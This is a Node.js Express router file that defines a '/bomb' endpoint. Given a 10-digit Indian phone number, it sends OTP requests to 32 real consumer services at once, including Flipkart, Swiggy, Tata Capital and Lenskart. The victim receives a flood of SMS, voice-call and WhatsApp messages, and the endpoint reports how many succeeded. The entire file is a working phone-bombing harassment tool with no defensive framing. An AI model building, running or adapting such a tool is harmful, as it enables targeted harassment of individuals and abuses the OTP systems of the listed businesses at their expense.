const express = require('express');
const axios = require('axios');
const router = express.Router();

const TIMEOUT = 8000;

const ENDPOINTS = [
  {
    name: 'Tata Capital Voice Call',
    type: 'Call',
    method: 'POST',
    url: 'https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ phone: phone, isOtpViaCallAtLogin: 'true' })
  },
  {
    name: '1MG Voice Call',
    type: 'Call',
    method: 'POST',
    url: 'https://www.1mg.com/auth_api/v6/create_token',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ number: phone, otp_on_call: true })
  },
  {
    name: 'Swiggy Call Verification',
    type: 'Call',
    method: 'POST',
    url: 'https://profile.swiggy.com/api/v3/app/request_call_verification',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ mobile: phone })
  },
  {
    name: 'Flipkart Voice Call',
    type: 'Call',
    method: 'POST',
    url: 'https://www.flipkart.com/api/6/user/voice-otp/generate',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ mobile: phone })
  },
  {
    name: 'Zivame Voice Call',
    type: 'Call',
    method: 'POST',
    url: 'https://api.zivame.com/v2/customer/login/send-otp',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ phone_number: phone, otp_type: 'voice' })
  },
  {
    name: 'Lenskart SMS',
    type: 'SMS',
    method: 'POST',
    url: 'https://api-gateway.juno.lenskart.com/v3/customers/sendOtp',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ phoneCode: '+91', telephone: phone })
  },
  {
    name: 'PharmEasy SMS',
    type: 'SMS',
    method: 'POST',
    url: 'https://pharmeasy.in/api/v2/auth/send-otp',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ phone: phone })
  },
  {
    name: 'Snitch SMS',
    type: 'SMS',
    method: 'POST',
    url: 'https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ mobile_number: '+91' + phone })
  },
  {
    name: 'ShipRocket SMS',
    type: 'SMS',
    method: 'POST',
    url: 'https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ mobileNumber: phone })
  },
  {
    name: 'GoKwik SMS',
    type: 'SMS',
    method: 'POST',
    url: 'https://gkx.gokwik.co/v3/gkstrict/auth/otp/send',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ phone: phone, country: 'in' })
  },
  {
    name: 'NewMe SMS',
    type: 'SMS',
    method: 'POST',
    url: 'https://prodapi.newme.asia/web/otp/request',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ mobile_number: phone, resend_otp_request: true })
  },
  {
    name: 'KPN WhatsApp',
    type: 'WhatsApp',
    method: 'POST',
    url: 'https://api.kpnfresh.com/s/authn/api/v1/otp-generate',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ notification_channel: 'WHATSAPP', phone_number: { country_code: '+91', number: phone } })
  },
  {
    name: 'Rappi WhatsApp',
    type: 'WhatsApp',
    method: 'POST',
    url: 'https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ country_code: '+91', phone: phone })
  },
  {
    name: 'Eka Care WhatsApp',
    type: 'WhatsApp',
    method: 'POST',
    url: 'https://auth.eka.care/auth/init',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ payload: { allowWhatsapp: true, mobile: '+91' + phone }, type: 'mobile' })
  },
  {
    name: 'Wakefit SMS',
    type: 'SMS',
    method: 'POST',
    url: 'https://api.wakefit.co/api/consumer-sms-otp/',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ mobile: phone })
  },
  {
    name: 'Hungama OTP',
    type: 'SMS',
    method: 'POST',
    url: 'https://communication.api.hungama.com/v1/communication/otp',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ mobileNo: phone, countryCode: '+91', appCode: 'un', messageId: '1', device: 'web' })
  },
  {
    name: 'Doubtnut',
    type: 'SMS',
    method: 'POST',
    url: 'https://api.doubtnut.com/v4/student/login',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ phone_number: phone, language: 'en' })
  },
  {
    name: 'PenPencil',
    type: 'SMS',
    method: 'POST',
    url: 'https://api.penpencil.co/v1/users/resend-otp?smsType=1',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ organizationId: '5eb393ee95fab7468a79d189', mobile: phone })
  },
  {
    name: 'BeepKart',
    type: 'SMS',
    method: 'POST',
    url: 'https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ phone: phone, city: 362 })
  },
  {
    name: 'Smytten',
    type: 'SMS',
    method: 'POST',
    url: 'https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ phone: phone, email: 'test@example.com' })
  },
  {
    name: 'MyHubble Money',
    type: 'SMS',
    method: 'POST',
    url: 'https://api.myhubble.money/v1/auth/otp/generate',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ phoneNumber: phone, channel: 'SMS' })
  },
  {
    name: 'Housing.com',
    type: 'SMS',
    method: 'POST',
    url: 'https://login.housing.com/api/v2/send-otp',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ phone: phone, country_url_name: 'in' })
  },
  {
    name: 'RentoMojo',
    type: 'SMS',
    method: 'POST',
    url: 'https://www.rentomojo.com/api/RMUsers/isNumberRegistered',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ phone: phone })
  },
  {
    name: 'Khatabook',
    type: 'SMS',
    method: 'POST',
    url: 'https://api.khatabook.com/v1/auth/request-otp',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ phone: phone, app_signature: 'wk+avHrHZf2' })
  },
  {
    name: 'Animall',
    type: 'SMS',
    method: 'POST',
    url: 'https://animall.in/zap/auth/login',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ phone: phone, signupPlatform: 'NATIVE_ANDROID' })
  },
  {
    name: 'Cosmofeed',
    type: 'SMS',
    method: 'POST',
    url: 'https://prod.api.cosmofeed.com/api/user/authenticate',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ phone: phone, version: '1.4.28' })
  },
  {
    name: "Spencer's",
    type: 'SMS',
    method: 'POST',
    url: 'https://jiffy.spencers.in/user/auth/otp/send',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ mobile: phone })
  },
  {
    name: "Shopper's Stop",
    type: 'SMS',
    method: 'POST',
    url: 'https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ mobile: phone, type: 'SIGNIN_WITH_MOBILE' })
  },
  {
    name: 'Lifestyle Stores',
    type: 'SMS',
    method: 'POST',
    url: 'https://www.lifestylestores.com/in/en/mobilelogin/sendOTP',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ signInMobile: phone, channel: 'sms' })
  },
  {
    name: 'PokerBaazi',
    type: 'SMS',
    method: 'POST',
    url: 'https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ mobile: phone, mfa_channels: 'phno' })
  },
  {
    name: 'My11Circle',
    type: 'SMS',
    method: 'POST',
    url: 'https://www.my11circle.com/api/fl/auth/v3/getOtp',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ mobile: phone, mfa_channels: 'phno' })
  },
  {
    name: 'RummyCircle',
    type: 'SMS',
    method: 'POST',
    url: 'https://www.rummycircle.com/api/fl/auth/v3/getOtp',
    headers: { 'Content-Type': 'application/json' },
    data: (phone) => ({ mobile: phone, isPlaycircle: false })
  }
];

async function fire(ep, phone) {
  const start = Date.now();
  try {
    const cfg = {
      method: ep.method,
      url: ep.url,
      headers: ep.headers || {},
      timeout: TIMEOUT,
      validateStatus: () => true
    };
    if (ep.data) {
      cfg.data = ep.data(phone);
      if (!cfg.headers['Content-Type'] && !cfg.headers['content-type']) {
        cfg.headers['Content-Type'] = 'application/json';
      }
    }
    const res = await axios(cfg);
    return {
      name: ep.name,
      type: ep.type,
      status: res.status,
      ok: res.status >= 200 && res.status < 300,
      ms: Date.now() - start,
      response: typeof res.data === 'string' ? res.data.slice(0, 200) : JSON.stringify(res.data).slice(0, 200)
    };
  } catch (e) {
    return {
      name: ep.name,
      type: ep.type,
      status: 0,
      ok: false,
      ms: Date.now() - start,
      error: e.message
    };
  }
}

router.get('/bomb', async (req, res) => {
  const phone = req.query.phone;
  if (!phone || !/^\d{10}$/.test(phone)) {
    return res.status(400).json({ error: 'phone must be 10 digits' });
  }

  const results = await Promise.all(ENDPOINTS.map(ep => fire(ep, phone)));

  const success = results.filter(r => r.ok).length;
  const failed = results.length - success;

  const byType = {};
  for (const r of results) {
    if (!byType[r.type]) byType[r.type] = { total: 0, success: 0, failed: 0 };
    byType[r.type].total++;
    if (r.ok) byType[r.type].success++;
    else byType[r.type].failed++;
  }

  res.json({
    phone: phone,
    total: results.length,
    success: success,
    failed: failed,
    byType: byType,
    results: results
  });
});

module.exports = router;